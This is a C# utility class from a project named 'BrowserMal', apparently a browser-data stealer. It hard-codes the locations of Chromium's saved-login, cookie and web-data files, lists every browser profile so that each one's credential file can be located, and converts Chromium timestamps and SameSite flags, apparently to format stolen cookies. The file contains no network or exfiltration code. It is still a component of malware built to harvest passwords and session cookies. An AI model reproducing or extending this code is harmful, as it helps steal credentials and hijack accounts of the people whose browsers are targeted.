using System;
using System.Collections.Generic;
using System.IO;

namespace BrowserMal.Browser
{
    public class ChromiumUtil
    {
		public static readonly string LOGIN_DATA = "\\Login Data";
		public static readonly string COOKIES = "\\Network\\Cookies";
		public static readonly string WEB_DATA = "\\Web Data";

		public static List<string> GetAllProfiles(string DirectoryPath, string pathType)
		{
			List<string> list = new List<string>
			{
				DirectoryPath + "\\Default" + pathType,
				DirectoryPath + pathType
			};

			if (Directory.Exists(DirectoryPath))
			{
				foreach (string profile in Directory.GetDirectories(DirectoryPath))
				{
					if (profile.Contains("Profile"))
					{
						list.Add(profile + pathType);
					}
				}
			}

			return list;
		}

		public static object ChromiumToUnixTimestamp(object chromiumTimestamp)
        {
			DateTime dateChromium = new DateTime(1601, 1, 1);
			DateTime dateUnix = new DateTime(1970, 1, 1);

			TimeSpan difference = dateUnix.Subtract(dateChromium);
			return ((Convert.ToInt64(chromiumTimestamp) / 1000000) - difference.TotalSeconds).ToString();
		}

		public static object DecodeSameSite(object value)
        {
			int samesite = (int)value;

			switch (samesite)
            {
				case -1:
					return "unspecified";
				case 1:
					return "lax";
				case 2:
					return "strict";
				default:
					return "unspecified";
			}
        }

		public static DateTime GetDateTimeFromTimestamp(string timestamp)
        {
			return DateTimeOffset.FromUnixTimeSeconds(Convert.ToInt64(timestamp)).DateTime;
		}

	}
}
